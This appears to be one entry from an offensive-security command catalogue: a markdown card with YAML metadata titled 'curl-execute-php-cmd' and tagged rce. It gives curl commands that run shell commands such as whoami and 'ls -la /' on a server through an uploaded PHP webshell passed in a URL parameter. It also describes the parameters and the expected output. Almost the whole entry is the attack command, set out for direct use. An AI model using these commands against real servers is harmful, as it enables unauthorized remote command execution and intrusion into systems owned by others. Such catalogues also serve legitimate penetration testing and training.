---
id: cmd-003
data: 'curl "http://target.com/uploads/shell.php?cmd=whoami"'
tags:
  - rce
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.731Z'
verified: false
validated: true
submitted: true
---
# curl-execute-php-cmd

## Command

```bash
curl "http://target.com/uploads/shell.php?cmd=whoami"
```

## Description

Executes a remote command on a server via an uploaded PHP webshell by passing the command in the URL query parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://target.com/uploads/shell.php` | URL of the uploaded PHP file | Yes |
| `?cmd=whoami` | Query parameter with command to execute | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/uploads/shell.php?cmd=whoami"
```

### Advanced Usage

```bash
curl "http://target.com/uploads/shell.php?cmd=ls -la /" --output cmd_output.txt
```

## Expected Output

Direct output from the executed command, e.g., 'www-data' for whoami, or file listing for ls.

## Related

- [[Related Procedure]]
